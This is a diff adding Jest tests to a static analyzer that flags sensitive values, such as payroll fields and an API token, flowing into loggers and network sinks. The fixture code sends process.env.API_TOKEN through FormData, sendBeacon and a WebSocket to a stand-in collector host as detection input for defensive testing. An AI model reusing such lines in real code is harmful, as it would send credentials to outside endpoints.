@@ -143,6 +143,37 @@ describe('sensitive data flow candidates', () => {
     expect(JSON.stringify(findings)).not.toContain('publicLabel');
   });
 
+  it('recognizes opt-in sensitive schema decorators', () => {
+    const root = '/toolip-sensitive-schema-decorators';
+    const code = [
+      'class Employee {',
+      '  @Sensitive() payrollCode!: string;',
+      '  @PersonalData() contactRef!: string;',
+      '  publicAlias!: string;',
+      '}',
+      'function logEmployee(employee: Employee) {',
+      '  logger.info(employee.payrollCode);',
+      '  logger.info(employee.contactRef);',
+      '  logger.info(employee.publicAlias);',
+      '}'
+    ].join('\n');
+    const project = createAstProjectAnalysis([
+      {
+        filePath: 'employee.ts',
+        absolutePath: `${root}/employee.ts`,
+        content: code
+      }
+    ]);
+    const findings = analyzeAstSource('employee.ts', code, project).filter(
+      (finding) => finding.ruleId === 'TLP-DATA-001'
+    );
+
+    expect(findings.map((finding) => finding.location?.line)).toEqual([7, 8]);
+    expect(JSON.stringify(findings)).not.toContain('payrollCode');
+    expect(JSON.stringify(findings)).not.toContain('contactRef');
+    expect(JSON.stringify(findings)).not.toContain('publicAlias');
+  });
+
   it('tracks credential values through async local parameters and return aliases', () => {
     const findings = analyzeAstSource(
       'src/telemetry.ts',
@@ -259,6 +290,46 @@ export async function handler() {
       findings.every((item) => item.metadata?.sinkClass === 'outbound-request')
     ).toBe(true);
     expect(JSON.stringify(findings)).not.toContain('API_TOKEN');
+  });
+
+  it('tracks sensitive values in FormData and browser network sinks without exposing them', () => {
+    const findings = analyzeAstSource(
+      'src/upload.ts',
+      [
+        'const token = process.env.API_TOKEN;',
+        'const body = new FormData();',
+        "body.append('credential', token);",
+        "body.set('session', token);",
+        "const method = 'append';",
+        "body[method]('key', token);",
+        "navigator.sendBeacon('/collect', token);",
+        "const socket = new WebSocket('wss://collector.invalid');",
+        'socket.send(token);',
+        'const local = { send: (value: string) => value };',
+        'local.send(token);'
+      ].join('\n')
+    ).filter((item) => item.ruleId === 'TLP-DATA-001');
+
+    expect(findings).toHaveLength(5);
+    expect(
+      findings.every((item) => item.metadata?.sinkClass === 'outbound-request')
+    ).toBe(true);
+    expect(JSON.stringify(findings)).not.toContain('API_TOKEN');
+  });
+
+  it('does not treat a shadowed FormData constructor as the browser API', () => {
+    const findings = analyzeAstSource(
+      'src/upload.ts',
+      [
+        'function handler(req: RequestLike, FormData: new () => { append(name: string, value: unknown): void }) {',
+        '  const token = process.env.API_TOKEN;',
+        '  const body = new FormData();',
+        "  body.append('credential', token);",
+        '}'
+      ].join('\n')
+    ).filter((item) => item.ruleId === 'TLP-DATA-001');
+
+    expect(findings).toHaveLength(0);
   });
 
   it('treats computed network client methods as outbound disclosure sinks', () => {
